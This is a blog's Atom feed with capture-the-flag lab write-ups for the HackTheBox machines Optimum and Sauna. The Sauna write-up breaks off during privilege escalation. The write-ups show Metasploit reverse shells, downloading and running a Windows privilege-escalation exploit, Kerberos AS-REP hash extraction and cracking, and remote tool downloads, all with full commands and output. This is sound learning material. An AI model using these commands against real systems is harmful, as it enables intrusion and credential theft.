<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="en" /><updated>2020-07-20T23:31:36-05:00</updated><id>/feed.xml</id><title type="html">Active Denial System</title><subtitle></subtitle><author><name>wittr</name></author><entry><title type="html">HackTheBox - Optimum</title><link href="/writeups/2020/07/20/HTB-Optimum.html" rel="alternate" type="text/html" title="HackTheBox - Optimum" /><published>2020-07-20T23:21:00-05:00</published><updated>2020-07-20T23:21:00-05:00</updated><id>/writeups/2020/07/20/HTB-Optimum</id><content type="html" xml:base="/writeups/2020/07/20/HTB-Optimum.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Optimum/Optimum.png&quot; alt=&quot;Optimum&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Optium is a fairly straightforward easy rated Windows box.  It involves simple enumeration and exploitation via a readily available metasploit module for a foothold.  For privilege escalation, it requires enumeration of patch levels of the system to determine a relevant exploit for escalation.&lt;/p&gt;

&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Ran the usual nmap &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -A -T4 -v 10.10.10.8&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
|_http-title: HFS /
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Windows;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:microsoft:windows
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I went to the website and saw it is running &lt;a href=&quot;https://www.rejetto.com/hfs/&quot;&gt;HTTP File Server software&lt;/a&gt; v2.3.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Optimum/optimum-website.png&quot; alt=&quot;Optimum-website&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I did a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit hfs&lt;/code&gt; and found this version seems to be vulnerable.&lt;/p&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;

&lt;p&gt;I loaded up msfconsole via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;msfconsole -q&lt;/code&gt; and found that there is a RCE metasploit module that we can use to gain a foothold.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;msf5 &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;search hfs
&lt;span class=&quot;go&quot;&gt;
Matching Modules
================

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   #&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;Name                                        Disclosure Date  Rank       Check  Description
&lt;span class=&quot;go&quot;&gt;   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2
014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;use exploit/windows/http/rejetto_hfs_exec
&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/http/rejetto_hfs_exec) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;show options
&lt;span class=&quot;go&quot;&gt;
Module options (exploit/windows/http/rejetto_hfs_exec):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   HTTPDELAY  10               no        Seconds to wait before terminating web server
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&amp;lt;path&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'
&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The path of the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic


&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/http/rejetto_hfs_exec) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOSTS 10.10.10.8
&lt;span class=&quot;gp&quot;&gt;RHOSTS =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.8
&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/http/rejetto_hfs_exec) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SRVHOST 10.10.14.2
&lt;span class=&quot;gp&quot;&gt;SRVHOST =&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.14.2
&lt;span class=&quot;gp&quot;&gt;msf5 exploit(windows/http/rejetto_hfs_exec) &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;exploit
&lt;span class=&quot;go&quot;&gt;
[*] Started reverse TCP handler on 10.10.14.2:4444
[*] Using URL: http://10.10.14.2:8080/Kzl4K6JceE
[*] Server started.
[*] Sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: URI.escape is obsolete
[*] Payload request received: /Kzl4K6JceE
[*] Sending stage (176195 bytes) to 10.10.10.8
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;[*] Meterpreter session 1 opened (10.10.14.2:4444 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;10.10.10.8:49162&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2020-07-20 21:32:54 &lt;span class=&quot;nt&quot;&gt;-0500&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;[!] Tried to delete %TEMP%\ytefKHKvAX.vbs, unknown result
[*] Server stopped.

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;getuid
&lt;span class=&quot;go&quot;&gt;Server username: OPTIMUM\kostas
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;

&lt;p&gt;I listed the kostas desktop folder and there was a user.txt.  No need to pivot so I grabbed the user.txt sitting in the Desktop folder.&lt;/p&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;

&lt;p&gt;Now that I had user it was time to enumerate to find a path to admin.  I used the windows exploit suggester &lt;a href=&quot;https://github.com/GDSSecurity/Windows-Exploit-Suggester&quot;&gt;tool&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To gather the systeminfo for it I just used the meterpreter session:&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;execute &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; cmd.exe &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/c systeminfo &amp;gt; systeminfo.txt&quot;&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;Process 2072 created.
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;Listing: C:\Users\kostas\Desktop
================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
40777/rwxrwxrwx   0       dir   2020-07-27 06:31:27 -0500  %TEMP%
100666/rw-rw-rw-  282     fil   2017-03-18 06:57:16 -0500  desktop.ini
100777/rwxrwxrwx  760320  fil   2014-02-16 05:58:52 -0600  hfs.exe
100666/rw-rw-rw-  3334    fil   2020-07-27 07:16:36 -0500  systeminfo.txt
100444/r--r--r--  32      fil   2017-03-18 07:13:18 -0500  user.txt.txt

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;download systeminfo.txt
&lt;span class=&quot;gp&quot;&gt;[*] Downloading: systeminfo.txt -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;systeminfo.txt
&lt;span class=&quot;gp&quot;&gt;[*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): systeminfo.txt -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;systeminfo.txt
&lt;span class=&quot;gp&quot;&gt;[*] download   : systeminfo.txt -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;systeminfo.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To get the script to run, it requires python2 and a library dependency.  I suggest using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pipenv&lt;/code&gt; in the cloned folder.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;pipenv --python 2.7
pipenv install xlrd
pipenv run python2 ./windows-exploit-suggester.py --database 2020-07-20-mssb.xls --systeminfo systeminfo.txt
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After executing the script, there’s quite a few suggestions.  The one in the official HTB writeup is MS016-032.  However, I had issues trying to get it to work from metasploit.  After some googling I decided to try MS16-098.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Back in my meterpreter session I did a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upload 41020.exe&lt;/code&gt; then opened a shell to execute it.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;shell
&lt;span class=&quot;go&quot;&gt;Process 2336 created.
Channel 5 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;C:\Users\kostas\Desktop&amp;gt;&lt;/span&gt;.&lt;span class=&quot;se&quot;&gt;\4&lt;/span&gt;1020.exe
&lt;span class=&quot;go&quot;&gt;.\41020.exe
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;C:\Users\kostas\Desktop&amp;gt;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;whoami
nt authority\system
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After this I simply went to the Desktop directory and grabbed the root.txt flag.&lt;/p&gt;

&lt;h2 id=&quot;lessons-learned&quot;&gt;Lessons Learned&lt;/h2&gt;

&lt;p&gt;On this box:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Refreshed metasploit module searching and exploit execution&lt;/li&gt;
  &lt;li&gt;Learned about a new python based windows priv esc tool (the suggester tool)&lt;/li&gt;
&lt;/ul&gt;</content><author><name>wittr</name></author><category term="writeups" /><summary type="html">Summary Optium is a fairly straightforward easy rated Windows box. It involves simple enumeration and exploitation via a readily available metasploit module for a foothold. For privilege escalation, it requires enumeration of patch levels of the system to determine a relevant exploit for escalation. Walkthrough Enumeration Ran the usual nmap nmap -A -T4 -v 10.10.10.8 PORT STATE SERVICE VERSION 80/tcp open http HttpFileServer httpd 2.3 |_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1 | http-methods: |_ Supported Methods: GET HEAD POST |_http-server-header: HFS 2.3 |_http-title: HFS / Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows I went to the website and saw it is running HTTP File Server software v2.3. I did a searchsploit hfs and found this version seems to be vulnerable. Foothold I loaded up msfconsole via msfconsole -q and found that there is a RCE metasploit module that we can use to gain a foothold. ```console msf5 &amp;gt; search hfs Matching Modules # Name Disclosure Date Rank Check Description 0 exploit/multi/http/git_client_command_exec 2014-12-18 excellent No Malicious Git and Mercurial HTTP Server For CVE-2 014-9390 1 exploit/windows/http/rejetto_hfs_exec 2014-09-11 excellent Yes Rejetto HttpFileServer Remote Command Execution</summary></entry><entry><title type="html">HackTheBox - Sauna</title><link href="/writeups/2020/07/18/HTB-Sauna.html" rel="alternate" type="text/html" title="HackTheBox - Sauna" /><published>2020-07-18T20:27:00-05:00</published><updated>2020-07-18T20:27:00-05:00</updated><id>/writeups/2020/07/18/HTB-Sauna</id><content type="html" xml:base="/writeups/2020/07/18/HTB-Sauna.html">&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Sauna/Sauna.png&quot; alt=&quot;Sauna&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;Sauna was a great box for learning some Active Directory recon and attacks through the use of impacket tooling.  It involved using &lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/23559.kerberos-pre-authentication-why-it-should-not-be-disabled.aspx&quot;&gt;ASREPRoast&lt;/a&gt; and cracking a hash to gain a foothold with a tool like evil-winrm, followed by enumeration of bad domain permissions to escalate privileges via a &lt;a href=&quot;https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync&quot;&gt;DCSync Attack&lt;/a&gt;.&lt;/p&gt;

&lt;h2 id=&quot;walkthrough&quot;&gt;Walkthrough&lt;/h2&gt;

&lt;h3 id=&quot;enumeration&quot;&gt;Enumeration&lt;/h3&gt;

&lt;p&gt;Starting with nmap as always: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -A -T4 -v 10.10.10.175&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    &lt;span class=&quot;nb&quot;&gt;bind
&lt;/span&gt;80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;server &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 2020-06-17 08:32:14Z&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
3269/tcp open  tcpwrapped
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Based off this nmap, it is pretty clear to see it seems to be a domain controller with ports like 53 (DNS), 88 (Kerberos), etc. open.&lt;/p&gt;

&lt;p&gt;I decided to checkout the website it is hosting.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTBoxes/Sauna/sauna-website.png&quot; alt=&quot;Sauna Website&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I poked around for awhile, it was basically a bank site.  I generally didn’t know what to pursue next so I went to the forums for clues.  I had not used impacket tooling much at this point, and it looked like some of their scripts was where to go next.&lt;/p&gt;

&lt;p&gt;I ended up playing with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers.py&lt;/code&gt; from impacket and learning its parameters and how it can be used for &lt;a href=&quot;https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a&quot;&gt;ASREPRoast&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;The user that worked was “fsmith” (a guess based off common username nomenclature) which basically was “Fergus Smith” from the “Meet the Team” section of the website.  So I ran the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GetNPUsers.py&lt;/code&gt; script.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python GetNPUsers.py egotistical-bank.local/fsmith &lt;span class=&quot;nt&quot;&gt;-no-pass&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; 10.10.10.175

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Getting TGT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;fsmith
&lt;span class=&quot;nv&quot;&gt;$krb5asrep$23$fsmith&lt;/span&gt;@EGOTISTICAL-BANK.LOCAL:ffc4a4278df19115d39740cd03e9db57&lt;span class=&quot;nv&quot;&gt;$a0425a79f8c405a2d4707123842038f135fe400c37d4d774b6dd3d2d9ecaa32b7621bc9a8784d9e77db5c9bc919905025b4bfddc4da93c6bcdcddef1a8208831dbc64ac6bb380288b7cb67f9c2000d74bdd80a7c5c80b99f3706568c1e615a8e6c762d95e7e212c1f3c362a9e076c9ce50e3ae634e8657d7c79188ab74598361a14c08522e8d5367324c1832305ffc6f3e923f32e2d86b4a812978c9eb30c2b6ca02632730b603bb16863f0b490e8a74bc2045dedd90148691919aeab2f6459d09dfc2a1085f849a93ad610ce83bdbb26988145e8c64f64c96632585186e712d500055c2328f0d2325b751f3e1885cd43a49bb006f64922d17865aaf6e09128b&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With this hash I ran it through John the ripper and used the usual rockyou.txt to see if I get a hit.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt fsmith-hash.txt

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5asrep, Kerberos 5 AS-REP etype 17/18/23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Press &lt;span class=&quot;s1&quot;&gt;'q'&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
Thestrokes23     &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
1g 0:00:00:36 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2020-07-15 23:22&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0.02755g/s 290401p/s 290401c/s 290401C/s ThetaNuTheta..Thessa1
Use the &lt;span class=&quot;s2&quot;&gt;&quot;--show&quot;&lt;/span&gt; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;foothold&quot;&gt;Foothold&lt;/h3&gt;

&lt;p&gt;Alright, now I’m getting somewhere! I decided to try the enum4linux script that comes with Kali since I had a username and password. However, it didn’t really point me at anything in particular and I didn’t keep it in my notes to post here.&lt;/p&gt;

&lt;p&gt;I eventually figured out that I could get a shell using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; which is a great tool.  I fired up a shell using the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;user&quot;&gt;User&lt;/h3&gt;

&lt;p&gt;Looking at the Desktop directory real quick I was able to grab the flag. I didn’t have to move laterally as fsmith was the user to own here.&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\FSmith\desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;dir&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;


    &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Directory:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\FSmith\desktop&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;


&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Mode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;LastWriteTime&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;-------------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;------&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;----&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;/23/2020&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10:03&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;             &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;


&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\FSmith\desktop&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;user.txt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;b55&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;root&quot;&gt;Root&lt;/h3&gt;

&lt;p&gt;Onto root we go, I enumerated using &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS&quot;&gt;winPEAS&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;First I had to get it on the system: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-WebRequest -Uri http://&amp;lt;myip&amp;gt;:8080/winPEAS.exe -OutFile winpeas.exe&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;It has a good amount of output, but something sure stood out!&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Looking&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AutoLogon&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;T1012&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
